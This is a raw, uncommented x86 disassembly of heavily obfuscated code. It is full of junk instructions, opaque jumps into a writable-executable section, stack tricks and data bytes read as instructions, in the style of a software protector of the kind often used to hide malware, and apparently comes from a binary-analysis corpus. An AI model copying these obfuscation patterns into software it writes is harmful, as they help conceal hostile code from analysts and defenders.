lea esp [ esp + 0x20 ]
jae rwxdata
pushfd
cmc
test eax eax
pushad
lea esp [ esp + 0x24 ]
jno rwxdata
xchg bl al
not bl
jmp rwxdata
test sp 0x97a6
bt dx si
xor ecx ecx
call sub_4269eb
pushfd
jmp rwxdata
pushad
lea esp [ esp + 0x20 ]
je rwxdata
pushfd
lodsb [ esi ]
call sub_425cd8
sbb esi ecx
mov esi edx
stc
shl dl 0x6
mov edx eax
bt sp bx
cmc
pushfd
stc
xor ebx ebx
mov [ esp ] ah
mov [ esp ] 0x26c95f95
mov [ esp ] bl
shr eax 0x10
add esp 0x4
cmp dh 0xb6
cmp edx 0x92ee9dbc
clc
cmp [ esi ] 0x0
pushad
lea esp [ esp + 0x20 ]
je rwxdata
pushfd
lea esp [ esp + 0x8 ]
jo rwxdata
pushad
pushfd
pushfd
lea esp [ esp + 0x48 ]
jmp rwxdata
pushad
mov eax 0x1
call sub_4269b4
add [ eax ] al
dec eax
popad
jo rwxdata
push ebx
call sub_420983
btc bx cx
rcr di 0xf
add ch 0x47
mov ecx [ esi + 0x4 ]
xor di ax
sub ecx 0x8
bt si 0x1
dec edi
rcl bh cl
neg di
shr ecx 0x1
bsr edi edx
sar bx 0xc
ror bl 0x6
mov edi [ esi ]
rcl bl 0x4
adc bl 0x3d
add edi [ ebp - 0x4 ]
shld bx ax 0x1
add esi 0x8
sbb bx 0x7714
test cx 0x4fec
mov bx [ esi ]
pushfd
pushfd
jmp sub_421ff5
jmp rwxdata
je rwxdata
mov ebx 0x42
add [ edi + 0x65 ] al
je rwxdata
inc ecx
insb
insb
outsd
arpl [ eax ] ax
push ecx
lea esp [ esp + 0x4 ]
je rwxdata
call sub_421e6d
and esi 0xbda0ca2b
btc edi ebx
bt di 0xc
xor eax eax
or si dx
bsr si bx
mov esi [ edx ]
cmc
pushad
call sub_422fd4
movzx esi bl
clc
rol si cl
add edi ebx
cmc
cmp ah bl
jmp rwxdata
pushfd
add [ ebp - 0x4 ] 0x14
pushfd
pushad
lea esp [ esp + 0x28 ]
jmp rwxdata
pushfd
pushfd
test eax 0x80000000
pushfd
pushad
mov [ esp + 0x4 ] 0x5197
mov [ esp ] cx
lea esp [ esp + 0x2c ]
je rwxdata
push 0xd2332ef5
mov [ ebp - 0x8 ] eax
sbb eax esp
aas
clc
mov eax [ esi ]
cmc
test eax eax
push 0x15da7c7
mov [ esp + 0x4 ] 0x40
push [ esp ]
jmp rwxdata
sub di si
sbb dl al
mov edx [ ebp - 0x4 ]
sar di 0xa
dec di
movsx di cl
sbb di 0xa30b
mov edi [ edx + 0x10 ]
pushfd
jmp rwxdata
test si 0x53a9
call sub_42526f
test cx 0xce0b
test esi esi
call sub_426c34
pushfd
jmp rwxdata
lea esp [ esp + 0xc ]
je rwxdata
bt di dx
bt sp 0xf
test edi edi
pushfd
jmp rwxdata
and eax 0xffff
mov [ esp ] dx
mov [ esp ] dh
lea esp [ esp + 0x4 ]
jmp rwxdata
lea esp [ esp + 0x8 ]
je rwxdata
pushfd
pushfd
xchg [ esp + 0x4 ] eax
pop eax
cwde
push [ ebp - 0x8 ]
setle ah
lea eax [ 0x0 ]
pushad
mov [ esp + 0x1c ] rwxdata
pushfd
jmp rwxdata
mov [ esp + 0x1c ] eax
pushfd
pushad
pushfd
pushfd
push [ esp + 0x48 ]
retn 0x4c
sub_4266ba
bt eax eax
pushfd
add edi 0x4
mov [ esp ] ah
mov [ esp + 0x8 ] 0x76
lea esp [ esp + 0x2c ]
jmp rwxdata
clc
shr ax 0x3
rol al cl
mov eax [ esi ]
cmp dh cl
push edx
clc
test eax eax
pushad
lea esp [ esp + 0x24 ]
je rwxdata
pushfd
add [ ebp - 0x4 ] 0x14
pushfd
pushad
lea esp [ esp + 0x28 ]
jmp rwxdata
jmp rwxdata
sub di si
sbb dl al
mov edx [ ebp - 0x4 ]
sar di 0xa
dec di
movsx di cl
sbb di 0xa30b
mov edi [ edx + 0x10 ]
pushfd
jmp rwxdata
pushad
cmc
pushfd
test eax 0x80000000
mov [ esp ] 0x75
jmp rwxdata
bt di dx
bt sp 0xf
test edi edi
pushfd
jmp rwxdata
jmp rwxdata
lea esp [ esp + 0x8 ]
je rwxdata
lea esp [ esp + 0x24 ]
je rwxdata
and esi 0xbda0ca2b
btc edi ebx
bt di 0xc
xor eax eax
movzx esi bl
clc
rol si cl
add edi ebx
test si 0x53a9
call sub_42526f
test cx 0xce0b
test esi esi
call sub_426c34
push 0x75399cc2
and eax 0xffff
mov [ esp ] bp
push 0x9a7f5cc9
mov [ esp + 0x4 ] cx
mov [ esp + 0x4 ] bl
lea esp [ esp + 0x8 ]
jmp rwxdata
or si dx
bsr si bx
mov esi [ edx ]
cmc
pushad
call sub_422fd4
mov [ ecx ] 0xdf
outsb
push 0x6c646e61
inc ebp
js rwxdata
pushfd
pushfd
xchg [ esp + 0x4 ] eax
pop eax
cwde
push [ ebp - 0x8 ]
setle ah
lea eax [ 0x0 ]
pushad
mov [ esp + 0x1c ] rwxdata
pushfd
jmp rwxdata
and al 0x8d
and al 0x24
call sub_422e71
pushad
call sub_42250b
btc si cx
jo rwxdata
mov [ esp + 0x1c ] eax
pushfd
pushad
pushfd
pushfd
push [ esp + 0x48 ]
retn 0x4c
cmp bl [ esi - 0x26 ]
out dx al
cmp cl [ esi + 0xa ]
push es
xor [ eax + 0x10773f63 ] esp
jb rwxdata
mov esi edi
test edi 0x5702cfeb
bt edx edx
sub esi eax
call sub_42698c
add [ eax ] al
inc edi
je rwxdata
imul ebp [ edi + 0x6e ] 0x746c6946
jb rwxdata
cmp [ edx - 0x5611ed6a ] edi
stosb [ edi ]
cvttsd2si esi [ cs : ebx - 0x7028eb6d ]
stosd [ edi ]
push es
mov al [ 0x10773f63 ]
sbb al 0x8c
int3
in al 0x3f
scasd [ edi ]
les ebp [ eax + esi * 4 + 0x540c1b6f ]
jo rwxdata
imul ebp [ edi + 0x6e ] rw-data
pushad
mov [ esp + 0x8 ] 0x8455
push edi
lea esp [ esp + 0x24 ]
call sub_422e71
pushad
mov [ esp + 0x4 ] ah
lea esp [ esp + 0x20 ]
jae rwxdata
pushfd
cmc
test eax eax
pushad
lea esp [ esp + 0x24 ]
jno rwxdata
xchg bl al
not bl
jmp rwxdata
test sp 0x97a6
bt dx si
xor ecx ecx
call sub_4269eb
pushfd
jmp rwxdata
pushad
lea esp [ esp + 0x20 ]
je rwxdata
pushfd
lodsb [ esi ]
call sub_425cd8
sbb esi ecx
mov esi edx
stc
shl dl 0x6
mov edx eax
bt sp bx
cmc
pushfd
stc
xor ebx ebx
mov [ esp ] ah
mov [ esp ] 0x26c95f95
mov [ esp ] bl
shr eax 0x10
add esp 0x4
cmp dh 0xb6
cmp edx 0x92ee9dbc
clc
cmp [ esi ] 0x0
pushad
lea esp [ esp + 0x20 ]
je rwxdata
pushfd
lea esp [ esp + 0x8 ]
jo rwxdata
pushad
mov eax 0x1
pushad
pushfd
pushfd
lea esp [ esp + 0x48 ]
jmp rwxdata
call sub_4269b4
add [ eax ] al
dec eax
popad
jo rwxdata
push ebx
call sub_420983
btc bx cx
rcr di 0xf
add ch 0x47
mov ecx [ esi + 0x4 ]
xor di ax
sub ecx 0x8
bt si 0x1
dec edi
rcl bh cl
neg di
shr ecx 0x1
bsr edi edx
sar bx 0xc
ror bl 0x6
mov edi [ esi ]
rcl bl 0x4
adc bl 0x3d
add edi [ ebp - 0x4 ]
shld bx ax 0x1
add esi 0x8
sbb bx 0x7714
test cx 0x4fec
mov bx [ esi ]
pushfd
pushfd
jmp sub_421ff5
jmp rwxdata
je rwxdata
xchg si bx
bswap bx
pop ebx
pushad
mov edi [ esp + 0x20 ]
push [ esp + 0x4 ]
pop esi
mov esi [ esp + 0x24 ]
call sub_425a01
add [ eax ] al
push ebx
je rwxdata
mov ebx 0x42
add [ edi + 0x65 ] al
je rwxdata
inc ecx
insb
insb
outsd
arpl [ eax ] ax
push ecx
lea esp [ esp + 0x4 ]
je rwxdata
call sub_421e6d
cmc
cmp ah bl
jmp rwxdata
pushfd
pushfd
test eax 0x80000000
pushfd
pushad
mov [ esp + 0x4 ] 0x5197
mov [ esp ] cx
lea esp [ esp + 0x2c ]
je rwxdata
push 0xd2332ef5
mov [ ebp - 0x8 ] eax
sbb eax esp
aas
clc
mov eax [ esi ]
cmc
test eax eax
push 0x15da7c7
mov [ esp + 0x4 ] 0x40
push [ esp ]
jmp rwxdata
pushfd
jmp rwxdata
lea esp [ esp + 0xc ]
je rwxdata
and eax 0xffff
mov [ esp ] dx
mov [ esp ] dh
lea esp [ esp + 0x4 ]
jmp rwxdata
sub_4266eb
rcl si cl
add edi ebx
btr si 0x3
mov esi [ edx ]
cmc
pushfd
test esi esi
mov [ esp + 0x4 ] dh
pushfd
push 0x471c9cb1
lea esp [ esp + 0x10 ]
je rwxdata
inc ah
mov esi edi
jmp rwxdata
push edi
xchg [ esp ] eax
push esi
lea eax [ 0x0 ]
lea esp [ esp + 0x4 ]
jb rwxdata
clc
cmp bl 0x55
add esi ebx
pushfd
mov [ esp ] 0xc0
push ebx
lea esp [ esp + 0x8 ]
jmp rwxdata
pushfd
mov [ esp ] rwxdata
pushad
pushad
mov [ esp ] edi
mov [ esp + 0x3c ] eax
pushfd
push edx
push [ esp + 0x44 ]
retn 0x48
pushad
mov [ esp + 0x4 ] 0x3bc1
mov [ esp + 0x1c ] rwxdata
pushfd
mov [ esp + 0x1c ] eax
pushfd
push [ esp + 0x20 ]
retn 0x24
rcr al cl
das
lea eax [ edi + 0x3cef715b ]
rcl ax 0xd
mov eax [ edx + 0xc ]
cmp sp si
add eax ebx
jmp rwxdata
sub_426734
lea esp [ esp + 0x2c ]
call sub_4225a3
bt ax 0x1
push 0xed1cc9b5
cmc
cmp eax 0x7d00
mov [ esp ] 0xd4
lea esp [ esp + 0x4 ]
jae rwxdata
not bl
dec bl
push ebx
push [ esp ]
inc ecx
lea esp [ esp + 0x8 ]
push 0xfd690d61
push 0x5fa04d0f
cmp ah 0x5
pushfd
jmp rwxdata
lea esp [ esp + 0xc ]
jae rwxdata
inc bl
inc ecx
or bl 0xfc
xchg ebp eax
shld ax bp 0x8
stc
mov eax ebp
shr bl cl
dec bl
pushad
mov bl 0x1
sub esp 0xffffffe0
test si sp
bt ax di
push 0x4c9718b0
xchg [ esp ] esi
cmp sp si
rcl si cl
mov esi edi
push 0x86cbe573
sub esi eax
jmp j_sub_422ee4
cmp al 0xb6
call sub_4251af
add [ eax ] al
inc edi
je rwxdata
cmpsb [ esi ] [ edi ]
outsd
arpl [ ecx + 0x6c ] sp
push esp
imul ebp [ ebp + 0x65 ] 0x53000000
je rwxdata
clc
lahf
mov [ 0x7a1046e2 ] eax
add [ eax + 0x4 ] bl
enter 0x28a4 0x4c
adc [ ecx ] dh
xchg ebx eax
inc [ ecx + 0x4dd4d950 ]
aad 0x9e
adc ah [ edi ]
pushfd
push ss
jns rwxdata
imul ebp [ ebp + 0x50 ] 0x746e696f
jb _start
push ebp
stosb [ edi ]
push ecx
mov edx 0x72d1b281
loope rwxdata
lodsd [ esi ]
xchg ecx eax
out dx al
and [ ebp + 0x69f996a5 ] 0x55
push eax
outsd
imul ebp [ esi + 0x74 ] 0x68007265
loope rwxdata
cli
or eax 0x43cbb5b9
aas
imul ecx [ ebx + eax - 0x44732327 ] 0x0
mov ah 0xcb
bound edx [ ecx + 0x3c ]
sub [ eax + 0x6f ] dh
insb
lodsb [ esi ]
mov al 0x6c
mov bl 0x68
xor [ eax + ecx * 2 ] dh
sahf
mov eax [ ebx ]
fst [ ecx ]
popad
push es
cmp cl ah
bound edx [ ecx + 0x41 ]
sbb [ 0xfffffffffbef2363 ] ebx
das
and ecx [ edi + 0x6b ]
pop edi
sbb ebp [ edi ]
out dx al
cmp eax 0xc5c68de6
mov [ esi ] edi
call sub_432f0b
sub_426787
push 0x3651e028
lea esp [ esp + 0x8 ]
jae rwxdata
jl rwxdata
jb rwxdata
call sub_422a18
push esi
lea esp [ esp + 0x4 ]
call sub_4225ad
cmp dx 0xbd1c
bt eax ebx
pushad
push [ esp ]
sub ecx ebx
call j_sub_426a30
push 0x1592fa47
mov [ esp ] ax
sub eax eax
push ebx
pushfd
call sub_425624
add esi ebx
pushfd
push 0x418dd011
lea esp [ esp + 0x8 ]
jmp rwxdata
test ch 0xb
push 0x9b7b5afb
sub eax eax
pushad
pushad
lea esp [ esp + 0x44 ]
call sub_422e71
pushad
lea esp [ esp + 0x20 ]
jae rwxdata
rcr al cl
das
lea eax [ edi + 0x3cef715b ]
rcl ax 0xd
mov eax [ edx + 0xc ]
cmp sp si
add eax ebx
jmp rwxdata
not al
lodsb [ esi ]
clc
jmp rwxdata
call sub_425ee6
push 0x6e79aee4
call sub_432f0b
push edi
xchg [ esp ] eax
push esi
lea eax [ 0x0 ]
lea esp [ esp + 0x4 ]
jb rwxdata
pushad
ror al 0x1
push edx
test bl cl
test bl 0x12
add al 0x2e
call sub_422f5e
add [ eax ] al
push edx
popad
inc esi
imul ebp [ ebp ] 0xc2444c6
pushfd
mov [ esp ] rwxdata
pushad
pushad
mov [ esp ] edi
mov [ esp + 0x3c ] eax
pushfd
push edx
push [ esp + 0x44 ]
retn 0x48
pushad
mov [ esp + 0x4 ] 0x3bc1
mov [ esp + 0x1c ] rwxdata
pushfd
mov [ esp + 0x1c ] eax
pushfd
push [ esp + 0x20 ]
retn 0x24
sub_42698c
call sub_420174
mov ebp esp
cmc
je rwxdata
pushfd
push esp
mov [ esp + 0x4 ] eax
clc
pushad
jmp rwxdata
push 0x9b755376
bt eax edx
mov [ esp ] eax
cmc
pushad
mov [ esp ] 0xe1
mov [ esp + 0x1c ] eax
call sub_420667
mov [ esp + 0x20 ] eax
test sp ax
stc
push [ esp ]
mov [ esp + 0x20 ] esi
pushfd
cmc
mov [ esp + 0x4 ] 0x75
mov [ esp + 0x20 ] edi
call sub_42638d
push 0x6aa9aedb
call sub_431bc1
sub_4269b4
mov [ ebp - 0x8 ] eax
lea esp [ esp + 0x4 ]
clc
shr ax 0x3
rol al cl
mov eax [ esi ]
cmp dh cl
push edx
clc
test eax eax
pushad
lea esp [ esp + 0x24 ]
je rwxdata
pushfd
add [ ebp - 0x4 ] 0x14
pushfd
pushad
lea esp [ esp + 0x28 ]
jmp rwxdata
jmp rwxdata
sub di si
sbb dl al
mov edx [ ebp - 0x4 ]
sar di 0xa
dec di
movsx di cl
sbb di 0xa30b
mov edi [ edx + 0x10 ]
pushfd
jmp rwxdata
pushad
cmc
pushfd
test eax 0x80000000
mov [ esp ] 0x75
jmp rwxdata
bt di dx
bt sp 0xf
test edi edi
pushfd
jmp rwxdata
jmp rwxdata
lea esp [ esp + 0x8 ]
je rwxdata
lea esp [ esp + 0x24 ]
je rwxdata
and esi 0xbda0ca2b
btc edi ebx
bt di 0xc
xor eax eax
movzx esi bl
clc
rol si cl
add edi ebx
test si 0x53a9
call sub_42526f
test cx 0xce0b
test esi esi
call sub_426c34
push 0x75399cc2
and eax 0xffff
mov [ esp ] bp
push 0x9a7f5cc9
mov [ esp + 0x4 ] cx
mov [ esp + 0x4 ] bl
lea esp [ esp + 0x8 ]
jmp rwxdata
or si dx
bsr si bx
mov esi [ edx ]
cmc
pushad
call sub_422fd4
mov [ ecx ] 0xdf
outsb
push 0x6c646e61
inc ebp
js rwxdata
pushfd
pushfd
xchg [ esp + 0x4 ] eax
pop eax
cwde
push [ ebp - 0x8 ]
setle ah
lea eax [ 0x0 ]
pushad
mov [ esp + 0x1c ] rwxdata
pushfd
jmp rwxdata
and al 0x8d
and al 0x24
call sub_422e71
pushad
call sub_42250b
btc si cx
jo rwxdata
mov [ esp + 0x1c ] eax
pushfd
pushad
pushfd
pushfd
push [ esp + 0x48 ]
retn 0x4c
cmp bl [ esi - 0x26 ]
out dx al
cmp cl [ esi + 0xa ]
push es
xor [ eax + 0x10773f63 ] esp
jb rwxdata
mov esi edi
test edi 0x5702cfeb
bt edx edx
sub esi eax
call sub_42698c
add [ eax ] al
inc edi
je rwxdata
imul ebp [ edi + 0x6e ] 0x746c6946
jb rwxdata
cmp [ edx - 0x5611ed6a ] edi
stosb [ edi ]
cvttsd2si esi [ cs : ebx - 0x7028eb6d ]
stosd [ edi ]
push es
mov al [ 0x10773f63 ]
sbb al 0x8c
int3
in al 0x3f
scasd [ edi ]
les ebp [ eax + esi * 4 + 0x540c1b6f ]
jo rwxdata
imul ebp [ edi + 0x6e ] rw-data
pushad
mov [ esp + 0x8 ] 0x8455
push edi
lea esp [ esp + 0x24 ]
call sub_422e71
pushad
mov [ esp + 0x4 ] ah
lea esp [ esp + 0x20 ]
jae rwxdata
pushfd
cmc
test eax eax
pushad
lea esp [ esp + 0x24 ]
jno rwxdata
xchg bl al
not bl
jmp rwxdata
test sp 0x97a6
bt dx si
xor ecx ecx
call sub_4269eb
pushfd
jmp rwxdata
pushad
lea esp [ esp + 0x20 ]
je rwxdata
pushfd
lodsb [ esi ]
call sub_425cd8
sbb esi ecx
mov esi edx
stc
shl dl 0x6
mov edx eax
bt sp bx
cmc
pushfd
stc
xor ebx ebx
mov [ esp ] ah
mov [ esp ] 0x26c95f95
mov [ esp ] bl
shr eax 0x10
add esp 0x4
cmp dh 0xb6
cmp edx 0x92ee9dbc
clc
cmp [ esi ] 0x0
pushad
lea esp [ esp + 0x20 ]
je rwxdata
pushfd
lea esp [ esp + 0x8 ]
jo rwxdata
pushad
mov eax 0x1
pushad
pushfd
pushfd
lea esp [ esp + 0x48 ]
jmp rwxdata
call sub_4269b4
add [ eax ] al
dec eax
popad
jo rwxdata
push ebx
call sub_420983
btc bx cx
rcr di 0xf
add ch 0x47
mov ecx [ esi + 0x4 ]
xor di ax
sub ecx 0x8
bt si 0x1
dec edi
rcl bh cl
neg di
shr ecx 0x1
bsr edi edx
sar bx 0xc
ror bl 0x6
mov edi [ esi ]
rcl bl 0x4
adc bl 0x3d
add edi [ ebp - 0x4 ]
shld bx ax 0x1
add esi 0x8
sbb bx 0x7714
test cx 0x4fec
mov bx [ esi ]
pushfd
pushfd
jmp sub_421ff5
jmp rwxdata
je rwxdata
xchg si bx
bswap bx
pop ebx
pushad
mov edi [ esp + 0x20 ]
push [ esp + 0x4 ]
pop esi
mov esi [ esp + 0x24 ]
call sub_425a01
add [ eax ] al
push ebx
je rwxdata
mov ebx 0x42
add [ edi + 0x65 ] al
je rwxdata
inc ecx
insb
insb
outsd
arpl [ eax ] ax
push ecx
lea esp [ esp + 0x4 ]
je rwxdata
call sub_421e6d
cmc
cmp ah bl
jmp rwxdata
pushfd
pushfd
test eax 0x80000000
pushfd
pushad
mov [ esp + 0x4 ] 0x5197
mov [ esp ] cx
lea esp [ esp + 0x2c ]
je rwxdata
push 0xd2332ef5
mov [ ebp - 0x8 ] eax
sbb eax esp
aas
clc
mov eax [ esi ]
cmc
test eax eax
push 0x15da7c7
mov [ esp + 0x4 ] 0x40
push [ esp ]
jmp rwxdata
pushfd
jmp rwxdata
lea esp [ esp + 0xc ]
je rwxdata
and eax 0xffff
mov [ esp ] dx
mov [ esp ] dh
lea esp [ esp + 0x4 ]
jmp rwxdata
sub_426a06
mov [ esp + 0x8 ] bl
mov [ esp ] 0xef4b
call sub_426cb8
add [ eax ] al
dec eax
popad
jo rwxdata
sbb eax [ eax ]
add [ eax + 0x65 ] cl
popad
jo rwxdata
insb
insb
outsd
arpl [ eax ] ax
push 0xaf29aede
call sub_4327ea
retn 0xffff
jae rwxdata
push cs
jb rwxdata
aaa
xchg esp eax
jno rwxdata
fcom st0
and [ ebp + 0xa ] dl
and eax 0x92fc8ce2
xor cl [ edi ]
jb rwxdata
xchg edx eax
pop esi
cmp cl [ esi ]
jns rwxdata
loop rwxdata
jg rwxdata
jmp rwxdata
mov cl 0xd8
jl rwxdata
cmpsb [ esi ] [ edi ]
jl rwxdata
push 0x413e32c2
sub [ ebx + ebp ] ah
cmp bh [ ebp - 0x74 ]
dec esi
xchg esi ebp
jecxz rwxdata
cmp eax 0x9e7dd20e
and al 0xa4
push ecx
inc edi
cli
push ecx
lea esp [ esp + 0x4 ]
je rwxdata
cmp al 0xc2
imul ecx [ esi + 0x2f73c895 ] 0x5f77b4ff
xor eax 0xa797e92d
and ebx [ edi + ecx * 8 ]
add [ ecx + ebp * 8 - 0x3dc4 ] bl
push 0x2f09aedc
call j_sub_431aea
adc [ esi - 0x6a ] edx
cmp al 0xd4
pop eax
jl rwxdata
pushad
mov eax 0x1
pushad
pushfd
pushfd
lea esp [ esp + 0x48 ]
jmp rwxdata
cmc
cmp ah bl
jmp rwxdata
jb rwxdata
push ebp
or ah [ 0xffffffff92fc8ce2 ]
dec esp
imul eax ebx 0xffffffec
fdiv st6
int3
xchg si bx
bswap bx
pop ebx
pushad
mov edi [ esp + 0x20 ]
push [ esp + 0x4 ]
pop esi
mov esi [ esp + 0x24 ]
call sub_425a01
add [ eax ] al
push ebx
je rwxdata
push 0xd2332ef5
mov [ ebp - 0x8 ] eax
sbb eax esp
aas
clc
mov eax [ esi ]
cmc
test eax eax
push 0x15da7c7
mov [ esp + 0x4 ] 0x40
push [ esp ]
jmp rwxdata
mov [ ecx ] 0xdf
outsb
push 0x6c646e61
inc ebp
js rwxdata
lea esp [ esp + 0xc ]
je rwxdata
and al 0x8d
and al 0x24
call sub_422e71
pushad
call sub_42250b
btc si cx
jo rwxdata
pushfd
add [ ebp - 0x4 ] 0x14
pushfd
pushad
lea esp [ esp + 0x28 ]
jmp rwxdata
pushfd
pushfd
test eax 0x80000000
pushfd
pushad
mov [ esp + 0x4 ] 0x5197
mov [ esp ] cx
lea esp [ esp + 0x2c ]
je rwxdata
cmp bl [ esi - 0x26 ]
out dx al
cmp cl [ esi + 0xa ]
push es
xor [ eax + 0x10773f63 ] esp
jb rwxdata
mov esi edi
test edi 0x5702cfeb
bt edx edx
sub esi eax
call sub_42698c
add [ eax ] al
inc edi
je rwxdata
imul ebp [ edi + 0x6e ] 0x746c6946
jb rwxdata
sub di si
sbb dl al
mov edx [ ebp - 0x4 ]
sar di 0xa
dec di
movsx di cl
sbb di 0xa30b
mov edi [ edx + 0x10 ]
pushfd
jmp rwxdata
test si 0x53a9
call sub_42526f
test cx 0xce0b
test esi esi
call sub_426c34
pushfd
jmp rwxdata
cmp [ edx - 0x5611ed6a ] edi
stosb [ edi ]
cvttsd2si esi [ cs : ebx - 0x7028eb6d ]
stosd [ edi ]
push es
mov al [ 0x10773f63 ]
sbb al 0x8c
int3
in al 0x3f
scasd [ edi ]
les ebp [ eax + esi * 4 + 0x540c1b6f ]
jo rwxdata
imul ebp [ edi + 0x6e ] rw-data
pushad
mov [ esp + 0x8 ] 0x8455
push edi
lea esp [ esp + 0x24 ]
call sub_422e71
pushad
mov [ esp + 0x4 ] ah
lea esp [ esp + 0x20 ]
jae rwxdata
pushfd
cmc
test eax eax
pushad
lea esp [ esp + 0x24 ]
jno rwxdata
bt di dx
bt sp 0xf
test edi edi
pushfd
jmp rwxdata
and eax 0xffff
mov [ esp ] dx
mov [ esp ] dh
lea esp [ esp + 0x4 ]
jmp rwxdata
xchg bl al
not bl
jmp rwxdata
test sp 0x97a6
bt dx si
xor ecx ecx
call sub_4269eb
pushfd
jmp rwxdata
pushad
lea esp [ esp + 0x20 ]
je rwxdata
lea esp [ esp + 0x8 ]
je rwxdata
pushfd
pushfd
xchg [ esp + 0x4 ] eax
pop eax
cwde
push [ ebp - 0x8 ]
setle ah
lea eax [ 0x0 ]
pushad
mov [ esp + 0x1c ] rwxdata
pushfd
jmp rwxdata
pushfd
lodsb [ esi ]
call sub_425cd8
sbb esi ecx
mov esi edx
stc
shl dl 0x6
mov edx eax
bt sp bx
cmc
pushfd
stc
xor ebx ebx
mov [ esp ] ah
mov [ esp ] 0x26c95f95
mov [ esp ] bl
shr eax 0x10
add esp 0x4
cmp dh 0xb6
cmp edx 0x92ee9dbc
clc
cmp [ esi ] 0x0
pushad
lea esp [ esp + 0x20 ]
je rwxdata
pushfd
lea esp [ esp + 0x8 ]
jo rwxdata
call sub_4269b4
add [ eax ] al
dec eax
popad
jo rwxdata
and esi 0xbda0ca2b
btc edi ebx
bt di 0xc
xor eax eax
or si dx
bsr si bx
mov esi [ edx ]
cmc
pushad
call sub_422fd4
movzx esi bl
clc
rol si cl
add edi ebx
mov [ esp + 0x1c ] eax
pushfd
pushad
pushfd
pushfd
push [ esp + 0x48 ]
retn 0x4c
push ebx
call sub_420983
btc bx cx
rcr di 0xf
add ch 0x47
mov ecx [ esi + 0x4 ]
xor di ax
sub ecx 0x8
bt si 0x1
dec edi
rcl bh cl
neg di
shr ecx 0x1
bsr edi edx
sar bx 0xc
ror bl 0x6
mov edi [ esi ]
rcl bl 0x4
adc bl 0x3d
add edi [ ebp - 0x4 ]
shld bx ax 0x1
add esi 0x8
sbb bx 0x7714
test cx 0x4fec
mov bx [ esi ]
pushfd
pushfd
jmp sub_421ff5
je rwxdata
mov ebx 0x42
add [ edi + 0x65 ] al
je rwxdata
inc ecx
insb
insb
outsd
arpl [ eax ] ax
call sub_421e6d
sub_426a30
lea esp [ esp + 0x28 ]
jne rwxdata
pushad
push [ esp + 0x8 ]
pushfd
jmp sub_4314fe
push esp
lea esp [ esp + 0x4 ]
call sub_4225a3
pushfd
mov [ esp ] cl
lea esp [ esp + 0x4 ]
jmp rwxdata
shld ax bp 0x8
stc
mov eax ebp
shr bl cl
dec bl
pushad
mov bl 0x1
sub esp 0xffffffe0
test si sp
bt ax di
push 0x4c9718b0
xchg [ esp ] esi
cmp sp si
rcl si cl
mov esi edi
push 0x86cbe573
sub esi eax
jmp j_sub_422ee4
sub_426c34
pushad
lea esp [ esp + 0x24 ]
je rwxdata
inc ah
mov esi edi
test cl 0x5a
pushad
add esi ebx
pushfd
pushad
lea esp [ esp + 0x44 ]
jmp rwxdata
push edi
xchg [ esp ] eax
push esi
lea eax [ 0x0 ]
lea esp [ esp + 0x4 ]
jb rwxdata
rcr al cl
das
lea eax [ edi + 0x3cef715b ]
rcl ax 0xd
mov eax [ edx + 0xc ]
cmp sp si
add eax ebx
jmp rwxdata
pushfd
mov [ esp ] rwxdata
pushad
pushad
mov [ esp ] edi
mov [ esp + 0x3c ] eax
pushfd
push edx
push [ esp + 0x44 ]
retn 0x48
pushad
mov [ esp + 0x4 ] 0x3bc1
mov [ esp + 0x1c ] rwxdata
pushfd
mov [ esp + 0x1c ] eax
pushfd
push [ esp + 0x20 ]
retn 0x24
sub_426c50
mov al 0x10
lea esp [ esp + 0xc ]
push edi
pushad
lea esp [ esp + 0x24 ]
call sub_422e71
pushfd
pushfd
adc al al
lea esp [ esp + 0x8 ]
je rwxdata
pushad
lea esp [ esp + 0x20 ]
jae rwxdata
jae rwxdata
jmp rwxdata
push 0x4ea24984
push [ esp ]
pushfd
mov [ esp + 0x4 ] dh
lea esp [ esp + 0xc ]
jne rwxdata
push ecx
lea esp [ esp + 0x4 ]
jne rwxdata
test si sp
bt ax di
push 0x4c9718b0
xchg [ esp ] esi
cmp sp si
rcl si cl
mov esi edi
push 0x86cbe573
sub esi eax
jmp j_sub_422ee4
pushfd
stosb [ edi ]
push [ esp ]
lea esp [ esp + 0x8 ]
jmp rwxdata
push ebp
stosb [ edi ]
push [ esp ]
push edi
lea esp [ esp + 0xc ]
jmp rwxdata
jmp rwxdata
pushad
mov [ esp + 0x8 ] 0x8455
push edi
lea esp [ esp + 0x24 ]
call sub_422e71
pushad
mov [ esp + 0x4 ] ah
lea esp [ esp + 0x20 ]
jae rwxdata
xchg bl al
not bl
jmp rwxdata
test sp 0x97a6
bt dx si
xor ecx ecx
call sub_4269eb
pushfd
lodsb [ esi ]
call sub_425cd8
sbb esi ecx
mov esi edx
stc
shl dl 0x6
mov edx eax
bt sp bx
cmc
pushfd
stc
xor ebx ebx
mov [ esp ] ah
mov [ esp ] 0x26c95f95
mov [ esp ] bl
shr eax 0x10
add esp 0x4
cmp dh 0xb6
cmp edx 0x92ee9dbc
clc
cmp [ esi ] 0x0
pushad
lea esp [ esp + 0x20 ]
je rwxdata
push ebx
call sub_420983
btc bx cx
rcr di 0xf
add ch 0x47
mov ecx [ esi + 0x4 ]
xor di ax
sub ecx 0x8
bt si 0x1
dec edi
rcl bh cl
neg di
shr ecx 0x1
bsr edi edx
sar bx 0xc
ror bl 0x6
mov edi [ esi ]
rcl bl 0x4
adc bl 0x3d
add edi [ ebp - 0x4 ]
shld bx ax 0x1
add esi 0x8
sbb bx 0x7714
test cx 0x4fec
mov bx [ esi ]
pushfd
pushfd
jmp sub_421ff5
sub_426c9a
cmc
cmp ebx 0x1
pushad
lea esp [ esp + 0x30 ]
je rwxdata
bsr bx sp
dec bl
mov bx [ esi ]
jmp rwxdata
pushad
stc
pushfd
pushad
cmp ebx 0x2
push [ esp ]
jmp rwxdata
and ebx 0xfff
cmp cl 0xb2
jmp rwxdata
lea esp [ esp + 0x48 ]
je rwxdata
cmc
add [ edi + ebx ] ax
rcl bx cl
movzx bx bl
and bx 0xfbd5
mov bx [ esi ]
jmp rwxdata
pushad
pushfd
pushad
stc
cmp ebx 0x3
lea esp [ esp + 0x44 ]
jns rwxdata
stc
stc
add esi 0x2
pushad
mov [ esp + 0x4 ] si
mov [ esp ] al
dec ecx
push [ esp ]
call sub_420015
add [ eax ] al
dec ecx
outsb
je rwxdata
stc
stc
cmc
and ebx 0xfff
cmc
pushad
add [ edi + ebx ] dx
pushad
pushfd
lea esp [ esp + 0x44 ]
jmp rwxdata
push ebp
lea esp [ esp + 0x4 ]
je rwxdata
push edi
pushfd
lea esp [ esp + 0x8 ]
test al 0x49
fbstp [ edx - 0xc9bbfa0 ]
sub eax 0x224de115
jb rwxdata
btr bx 0xd
clc
btc bx di
